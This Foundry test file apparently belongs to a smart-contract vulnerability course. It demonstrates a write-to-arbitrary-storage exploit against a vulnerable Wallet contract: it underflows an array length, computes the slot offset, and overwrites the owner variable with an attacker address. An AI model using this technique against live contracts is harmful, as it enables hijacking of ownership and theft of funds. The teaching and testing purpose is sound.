// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/5.13.2-Write-to-Arbitrary-Storage-Location-vulnerability.sol";

contract WalletExploitTest is Test {
    Wallet wallet;
    address attacker;

    function setUp() public {
        // Deploy the vulnerable Wallet contract; owner will be this test contract
        wallet = new Wallet();
        // Derive a deterministic attacker address
        attacker = vm.addr(1);
    }

    function testWriteToArbitraryStorage() public {
        // Confirm initial owner is the deployer (this test contract)
        assertEq(wallet.owner(), address(this));

        // Step 1: Attacker underflows bonusCodes.length via PopBonusCode()
        vm.prank(attacker);
        wallet.PopBonusCode();

        // Step 2: Compute the storage slot where bonusCodes data begins
        bytes32 dataSlot = keccak256(abi.encode(uint256(0)));

        // Step 3: Compute idx such that bonusCodes[idx] maps to slot 1 (owner)
        uint256 idx;
        unchecked {
            // (1 - dataSlot) mod 2^256
            idx = uint256(1) - uint256(dataSlot);
        }

        // Step 4: Attacker overwrites owner by writing to bonusCodes[idx]
        vm.prank(attacker);
        wallet.UpdateBonusCodeAt(idx, uint256(uint160(attacker)));

        // Verify that owner has been changed to the attacker address
        assertEq(wallet.owner(), attacker);
    }
}